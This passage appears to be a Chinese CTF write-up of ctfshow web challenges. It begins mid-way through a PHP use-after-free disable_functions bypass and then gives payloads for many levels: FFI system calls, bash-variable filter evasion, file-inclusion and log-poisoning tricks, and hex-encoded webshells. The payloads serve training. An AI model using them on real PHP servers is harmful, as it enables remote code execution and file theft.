str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; write($abc, 0x60, 2); write($abc, 0x70, 6); write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if(!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if(!($elf &#x3D; parse_elf($base))) &#123; die(&quot;Couldn&#39;t parse ELF header&quot;); &#125; if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123; die(&quot;Couldn&#39;t get basic_functions address&quot;); &#125; if(!($zif_system &#x3D; get_system($basic_funcs))) &#123; die(&quot;Couldn&#39;t get zif_system address&quot;); &#125; $fake_obj_offset &#x3D; 0xd0; for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123; write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); &#125; write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd); exit(); &#125; ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush(); #需要通过url编码哦 web73-74c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;include(&#39;&#x2F;flagc.txt&#39;);exit(); Web75-76读目录，发现flag36.txt，但是不能包含，uaf失败 用mysql的load_file读取文件 c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;, &#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row) &#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-getMessage();exit(0);&#125;exit(0); 感觉。。。正常应该是不会这样的 ，没用户名和密码怎么读 web77利用FFI，php7.4以上才有 $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象 $a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的 这里因为不能回显，所以利用重定向将readflag内容输出到其他地方 $ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数 https://www.php.net/manual/zh/ffi.cdef.php https://www.php.cn/php-weizijiaocheng-415807.html 实话实话没太看懂 c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit(); 打完payload访问一下1.txt就能拿到flag 后边的题感觉有点玄幻了，就单纯的记一下方法 web118 源码里有system($code);但是有waf !preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39; 利用bash内置变量来rce $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? # echo $&#123;PWD&#125; &#x2F;root # echo $&#123;PWD:0:1&#125; #表示从0下标开始的第一个字符 &#x2F; # echo $&#123;PWD:~0:1&#125; #从结尾开始往前的第一个字符 t # echo $&#123;PWD:~0&#125; t # echo $&#123;PWD:~A&#125; #所以字母和0具有同样作用 t # echo $&#123;PATH&#125; &#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin &#x2F;&#x2F;利用系统变量构造nl命令 $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.??? $&#123;PATH:~A&#125;$&#123;PWD:~A&#125;是nl 或者 $&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.??? SHLVL&#96;是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时&#96;$&#123;SHLVL&#125;&#x3D;1&#96;，然后在此shell中再打开一个shell时&#96;$&#123;SHLVL&#125;&#x3D;2&#96;。 &#96;$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;&#96;就输出&#96;&#x2F; $&#123;#&#125;是0，$&#123;SHLVL&#125;为1&#96; &#96;$&#123;#PWD&#125;是回显字符数，$&#123;PWD&#125; 是&#x2F;root，$&#123;#PWD&#125;是5 web119禁用了$&#123;PATH $&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; &#x3D;&#x3D;&#x3D;&#x3D;&gt; t $&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125; &#x3D;&#x3D;&#x3D;&#x3D;&gt; &#x2F; $&#123;SHLVL&#125; &#x2F;&#x2F;一般是一个个位数 $&#123;#SHLVL&#125; &#x2F;&#x2F;1，表示结果的字符长度 $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125; &#x2F;&#x2F;表示&#x2F; $&#123;USER&#125; &#x2F;&#x2F;www-data $&#123;PHP_VERSION:~A&#125; &#x2F;&#x2F;2 $&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; &#x2F;&#x2F;at &#x2F;bin&#x2F;cat flag.php $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.??? $&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? web120&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; payload $&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.??? 或者 $&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? web121 &lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\&#x3D;|\\^|\\*|\\x26|\\%|\\&lt;|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; 相比上一题，多过滤了一个SHLVL，那就用#?代替 payload $&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.??? 相当于 /bin/bash64 flag.php 或者 $&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.??? &#x2F;bin&#x2F;rev web122&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;code&#39;]))&#123; $code&#x3D;$_POST[&#39;code&#39;]; if(!preg_match(&#39;&#x2F;\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\&#x2F;|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\&#x3D;|\\^|\\*|\\x26|#|%|\\&gt;|\\&#39;|\\&quot;|\\&#96;|\\||\\,&#x2F;&#39;, $code))&#123; if(strlen($code)&gt;65)&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.&#39;you are so long , I dont like &#39;.&#39;&lt;&#x2F;div&gt;&#39;; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;&#39;.system($code).&#39;&lt;&#x2F;div&gt;&#39;; &#125; &#125; else&#123; echo &#39;&lt;div align&#x3D;&quot;center&quot;&gt;evil input&lt;&#x2F;div&gt;&#39;; &#125; &#125; ?&gt; payload 通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误 code&#x3D;&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.??? *#可能存在成功的机会，不断刷新* web124&lt;?php &#x2F;* # -*- coding: utf-8 -*- # @Author: 收集自网络 # @Date: 2020-09-16 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-06 14:04:45 *&#x2F; error_reporting(0); &#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;]))&#123; show_source(__FILE__); &#125;else&#123; &#x2F;&#x2F;例子 c&#x3D;20-1 $content &#x3D; $_GET[&#39;c&#39;]; if (strlen($content) &gt;&#x3D; 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist &#x3D; [&#39; &#39;, &#39;\\t&#39;, &#39;\\r&#39;, &#39;\\n&#39;,&#39;\\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\\[&#39;, &#39;\\]&#39;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;]; preg_match_all(&#39;&#x2F;[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*&#x2F;&#39;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; &#x2F;&#x2F;帮你算出答案 eval(&#39;echo &#39;.$content.&#39;;&#39;); &#125; 不能有特殊字符，不能有除whitelist里面的字母，大概思路就是利用进制转换以数字构造字母题中可用的进制转换函数：&#39;base_convert&#39;, &#39;bindec&#39;,&#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39; $_GET[abs]($_GET[acos]) &#x2F;&#x2F;strlen($content) &gt;&#x3D; 80，有长度限制，所以利用get命令执行 ↓ $_GET&#123;abs&#125;($_GET&#123;acos&#125;) &#x2F;&#x2F;[]在黑名单，用&#123;&#125;代替 ↓ $pi&#x3D;_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;) ↓ 进制转换 base_convert(number,frombase,tobase)：在任意进制之间转换数字 dechex()：把十进制数转换为十六进制数 hex2bin()：把十六进制值的字符串转换为二进制，返回 ASCII 字符 最重要的是hex2bin函数，但是不在白名单里面 base_convert构造hex2bin（我想用base_convert直接转_GET，但是只能得到get） base_convert(&#39;hex2bin&#39;,36,10) → 37907361743 _GET → hex十六进制 5f474554 (不能有字母所以十六进制不行) → dec十进制 1598506324 (在线转换) 所以_GET可以写为 hex2bin(dechex(1598506324)) ↓ base_convert(&#39;37907361743&#39;,10,36)(dechex(1598506324)) 最后的payload ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;ls ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs&#x3D;system&amp;acos&#x3D;cat * payload1： ?c&#x3D;$pi&#x3D;base_convert,$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;) 添加头部信息：1&#x3D;tac flag.php payload2： ?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs&#x3D;system&amp;acos&#x3D;tac flag.php 文件包含web78payload file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web79题目： if(isset($_GET[&#39;file&#39;]))&#123; $file &#x3D; $_GET[&#39;file&#39;]; $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file); &#125;else&#123; highlight_file(__FILE__); &#125; 将php替换成了???,考虑使用data协议进行base64解码。payload ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D; web80题目： if(isset($_GET[&#39;file&#39;]))&#123; $file &#x3D; $_GET[&#39;file&#39;]; $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file); &#125;else&#123; highlight_file(__FILE__); &#125; data也禁用了，尝试日志注入攻击。日志的位置，/var/log/nginx/access.log。在user-agent的位置，首先&lt;?php system(&#39;ls&#39;);?&gt;，列出来文件。之后读目标文件，&lt;?php system(&#39;cat fl0g.php&#39;); ?&gt; 还可以直接写马 web81题目： if(isset($_GET[&#39;file&#39;]))&#123; $file &#x3D; $_GET[&#39;file&#39;]; $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file); &#125; 过滤了php、data、:，尝试上题方法，同上题 web87https://xz.aliyun.com/t/8163#toc-3 利用php://filter的编码来使结束的代码失效 web88data协议 data://text/plain;base64,poc file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwqJyk7 web117还是利用php://filter的编码来使结束的代码失效 **convert.iconv.**这个过滤器还是用的。 ucs-2 和ucs-4都能用。 ucs-2 二位一反转，字符个数要在偶数位上，ucs-4 四位一反转，字符个数要是4的倍数。位数好控制，参数改改长度就行了。 file&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;a.php post:contents&#x3D;?&lt;hp pvela$(P_SO[T]1;)&gt;? php特性web89数组绕过 intval()–非空的数组会返回1，可以采用数组绕过intval()函数 preg_match() 返回的匹配次数，不匹配为0，匹配成功1次即为1，然后停止搜索，该函数只会匹配一行，可以%0a换行绕过 preg_match_all()不同于此，它会一直搜索 直到到达结尾。 如果发生错误preg_match()返回 FALSE。 web90 加个大于号，或者转成八进制，十六进制 intval支持不同进制，这里base指定是0，那么intval会根据我们输入情况使用进制 intval取的是我们所输入内容开头的整数，也就是说我们传入含有字符的字符串，例如?num=4476a,那么intval(“4476a”)也等于4476 web91 /m 表示多行匹配，匹配换行符两端的潜在匹配。影响正则中的^$符号 多行匹配可以通过%0a（回车键）绕过 web92&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;]))&#123; $num &#x3D; $_GET[&#39;num&#39;]; if($num&#x3D;&#x3D;4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)&#x3D;&#x3D;4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125; 进制转换或者用e来当作科学计数法 web93过滤了字母，用八进制 web94strpos($num, “0”) strpos()函数的理解：该函数是从我们传入的参数num中，寻找并匹配数字0，第一位匹配正确返回0，第二位匹配正确返回1，以后递推，所以在题中即为只要匹配到，输出就为true，取反就为false.所以可以通过除了第一位其他位出现0的方法让if条件为假。该函数并不是只匹配一行数据。回车后匹配仍有效。可以通过?num=%0a4476绕过 只要0不在第一位就行（但是必须有，所以可以用八进制带加号+010574，或者放在小数点上 web95&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;]))&#123; $num &#x3D; $_GET[&#39;num&#39;]; if($num&#x3D;&#x3D;4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;&#x2F;[a-z]|\\.&#x2F;i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)&#x3D;&#x3D;&#x3D;4476)&#123; echo $flag; &#125; &#125; 第一个if是弱比较，只能进制转换 后边的strpos可以需要在转换了进制的数字前加点不影响大小的东西比如回车换行空格加号 web96 相对路径绕过 或者伪协议 web97 md5函数不能处理数组，会返回null web98https://www.php.cn/php-notebook-172859.html https://www.php.cn/php-weizijiaocheng-383293.html include(&quot;flag.php&quot;);#本php文档包含了一个flag.php文件，是我们想要的flag $_GET?$_GET&#x3D;&amp;$_POST:&#39;flag&#39;;#$_GET存在，则_GET&#x3D;&amp;$_POST否则$_GET值为&#39;flag‘ $_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_COOKIE:&#39;flag&#39;;#中间两行代码看起来貌似没用 $_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;flag&#39;; highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);#如果get传参了HTTP_FLAG&#x3D;flag，就highlight_file($flag) web99highlight_file(__FILE__); $allow &#x3D; array(); for ($i&#x3D;36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i)); &#125; if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#123; file_put_contents($_GET[&#39;n&#39;], $_POST[&#39;content&#39;]); &#125; in_array()in_array(search,array,type) search—必须，规定在数组中搜索的值 array—必需，规定搜索的数组 type—可选，如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 如果设置了第三个参数，函数只有在元素存在于数组中且数据类型与给定值相同时才返回 true。 而题中没有设置，这里可以默认没有设置，即只是弱类型匹配 利用了in_array的弱类型比较， web100highlight_file(__FILE__); include(&quot;ctfshow.php&quot;); &#x2F;&#x2F;flag in class ctfshow; $ctfshow &#x3D; new ctfshow(); $v1&#x3D;$_GET[&#39;v1&#39;]; $v2&#x3D;$_GET[&#39;v2&#39;]; $v3&#x3D;$_GET[&#39;v3&#39;]; $v0&#x3D;is_numeric($v1) and is_numeric($v2) and is_numeric($v3); if($v0)&#123; if(!preg_match(&quot;&#x2F;\\;&#x2F;&quot;, $v2))&#123; if(preg_match(&quot;&#x2F;\\;&#x2F;&quot;, $v3))&#123; eval(&quot;$v2(&#39;ctfshow&#39;)$v3&quot;); &#125; &#125; &#125; 这里要看运算优先级 逻辑运算符&gt;逻辑运算（赋值）&gt;and、or v0的取值只和v1有关。v1参数为数字，没有其他限制，但是v2不能有；标志，v3必须有； web101 利用反射类读 web102-103call_user_func() 把第一个参数作为回调参数调用 本题中要求v2是数字，然后通过substr函数截取v2的第三位开始的数据，及以后的数据。v1、v3题中没有限制， is_numerc() 该函数在php5版本下有漏洞，可以识别十六进制，所以可以将一句话木马写作十六进制的格式 故构造v2=(&lt;?php eval($_REQUEST[a]);?&gt;) v2=3c3f706870206576616c28245f524551554553545b615d293b3f3e v1可以利用hex2bin()函数来进行把十六进制字符转换成ASCII字符，即我们想要的一句话木马。 payload get: v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php post: v1&#x3D;hex2bin web103过滤了php但是这里的v2用的是短标签 web104highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123; $v1 &#x3D; $_POST[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; if(sha1($v1)&#x3D;&#x3D;sha1($v2))&#123; echo $flag; &#125; &#125; 可以用数组绕过，也可以找个前几位数字一样的 web105 变量覆盖，get suces=flag后 $suces=$flag post error=suces后 $error=$suces 也就是$error=$flag，在经过if判断的时候通过die函数就会显示flag web106 跟104差不多 web107 整点空数组绕过(虽然上边这个有点问题，但是过了就行 还有其他的方法 web108highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])&#x3D;&#x3D;&#x3D;FALSE) &#123; die(&#39;error&#39;); &#125; &#x2F;&#x2F;只有36d的人才能看到flag if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123; echo $flag; &#125; ereg() 正则匹配的一种，存在NULL截断漏洞，导致正则过滤被绕过，可以使用%00截断正则匹配 strrev() 字符串逆序，0x36d十进制为877，逆序即为778 故可以构建payload web109 当新建ReflectionClass类并传入PHP代码时，会返回代码的运行结果，可以通过echo显示即使传入了空的括号，代码依旧可以运行，且error_reporting(0)的存在阻止了报错 web110highlight_file(__FILE__); error_reporting(0); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123; $v1 &#x3D; $_GET[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; if(preg_match(&#39;&#x2F;\\~|\\&#96;|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\&#x3D;|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\&#x2F;|[0-9]&#x2F;&#39;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#39;&#x2F;\\~|\\&#96;|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\&#x3D;|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\&#x2F;|[0-9]&#x2F;&#39;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;); &#125; 利用原生类FilesystemIterator配合getcwd来读文件目录，然后直接访问就行了 web111highlight_file(__FILE__); error_reporting(0); include(&quot;flag.php&quot;); function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 &#x3D; &amp;$$v2;&quot;); var_dump($$v1); &#125; if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123; $v1 &#x3D; $_GET[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; if(preg_match(&#39;&#x2F;\\~| |\\&#96;|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\&#x3D;|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\&#x2F;|[0-9]|\\&lt;|\\&gt;&#x2F;&#39;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#39;&#x2F;\\~| |\\&#96;|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\&#x3D;|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#39;|\\,|\\.|\\?|\\\\\\\\|\\&#x2F;|[0-9]|\\&lt;|\\&gt;&#x2F;&#39;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $v1))&#123; getFlag($v1,$v2); &#125; &#125; 利用变量覆盖让$ctfshow=全局变量 web112highlight_file(__FILE__); error_reporting(0); function filter($file)&#123; if(preg_match(&#39;&#x2F;\\.\\.\\&#x2F;|http|https|data|input|rot13|base64|string&#x2F;i&#39;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125; &#125; $file&#x3D;$_GET[&#39;file&#39;]; if(! is_file($file))&#123; highlight_file(filter($file)); &#125;else&#123; echo &quot;hacker!&quot;; &#125; filter协议直接读，或者用一些没被过滤的编码 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php compress.zlib:&#x2F;&#x2F;flag.php web113highlight_file(__FILE__); error_reporting(0); function filter($file)&#123; if(preg_match(&#39;&#x2F;filter|\\.\\.\\&#x2F;|http|https|data|data|rot13|base64|string&#x2F;i&#39;,$file))&#123; die(&#39;hacker!&#39;); &#125;else&#123; return $file; &#125; &#125; $file&#x3D;$_GET[&#39;file&#39;]; if(! is_file($file))&#123; highlight_file(filter($file)); &#125;else&#123; echo &quot;hacker!&quot;; filter被禁了，可以换一个 或这利用多次重复绕过is_file的判断 linux里/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容 payload： 